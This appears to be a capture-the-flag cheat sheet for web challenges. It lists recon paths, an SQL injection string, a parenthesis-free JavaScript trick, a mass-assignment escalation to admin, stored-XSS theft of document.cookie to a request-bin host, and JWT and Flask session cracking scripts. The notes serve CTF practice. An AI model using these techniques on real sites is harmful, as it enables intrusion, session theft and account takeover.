[BACK](../README.md)
# Web

- Inspect HTML
- Inspect JS
- Inspect Debug tab
- Inspect CSS
- Search for /robots.txt
- If the server is apache, try /.htaccess
- If MacOS: try /.DS_Store

When prompted for a password:

- Try switching request to put or post

## SQL Injection

```sql
' OR 1 = 1 UNION SELECT 1
```
If error:
- Try adding a limit to the amount of Rows
- Try adding more columns

#### If () are blocked:  
```javascript
 `${console.log`test`}`
 //instead of
 console.log("test")
 ```
## API
- Check OPTIONS verb
- Try every verb
- Try passing more fields in an "update" endpoint

ex: If the user object is this: 
```json
{
    "username":"username",
    "status":"user"
}
```
and the update endpoint asks for this:
```json
{
    "username":"username"
}
```
Pass this:
```json
{
    "username":"username",
    "status":"admin"
}
```

## Path Traversal

Useful to check:
- admin.php
- login.php
- Add ~ at the end of the php files
    - Vim backup files are stored with the file name + ~
- /etc/apache2/sites-enabled/000-default or /etc/apache2/sites-available/default
## Different Angular XSS payloads
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md
    
## StoredXSS

To try to intercept requests from the page:

https://requestbin.myworkato.com/

Can add link to img src, or change window.location to this and add "?flag=" + document.cookie

## JWT

- https://jwt.io/
- https://github.com/lmammino/jwt-cracker
  - Needed for `crackjwt.sh`
```bash
crackjwt.sh [jwtToken]
```


## Flask session token:
- https://github.com/Paradoxis/Flask-Unsign
  - Needed for `crack_flask_token.sh` and `edit_flask_token.sh`
- https://www.kirsle.net/wizards/flask-session.cgi

```bash
crack_flask_token.sh [token]
```

```bash
edit_flask_token.sh [payload] [secret]
```